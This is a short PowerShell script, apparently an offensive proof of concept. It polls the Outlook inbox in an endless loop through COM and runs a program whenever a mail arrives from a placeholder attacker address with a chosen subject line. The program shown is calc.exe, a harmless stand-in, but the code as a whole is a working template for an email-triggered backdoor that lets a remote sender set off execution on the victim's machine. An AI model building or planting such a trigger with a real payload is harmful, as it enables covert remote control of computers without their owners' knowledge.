while($true){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$inbox.items | foreach { 
if($_.SenderEmailAddress -match "ATTACKER@EMAILADDRESS.COM" -and $_.subject -match "CUSTOMSUBJECT")
{Invoke-Item C:\Windows\System32\calc.exe}}}
